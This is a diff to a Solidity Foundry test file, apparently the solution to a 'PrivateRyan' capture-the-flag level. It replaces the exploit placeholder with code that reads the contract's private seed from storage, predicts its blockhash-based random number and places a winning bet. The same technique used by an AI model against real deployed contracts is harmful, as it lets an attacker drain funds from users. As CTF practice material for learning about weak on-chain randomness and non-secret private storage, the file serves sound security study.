@@ -15,9 +15,22 @@ contract PrivateRyanTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        uint256 seed = uint256(vm.load(address(instance), bytes32(uint256(0))));
+        uint256 bet = computeBet(seed);
+        instance.spin{value: 0.01 ether}(bet);
 
         checkSuccess();
+    }
+
+    function computeBet(uint256 seed) internal view returns (uint256) {
+        uint256 FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399;
+        uint256 blockNumber = block.number - seed;
+        uint256 hashVal = uint256(blockhash(blockNumber));
+
+        uint256 factor = FACTOR * 100 / 100; // Здесь max равно 100
+        uint256 num = uint256((uint256(hashVal) / factor)) % 100;
+
+        return num;
     }
 
     function checkSuccess() internal view override {
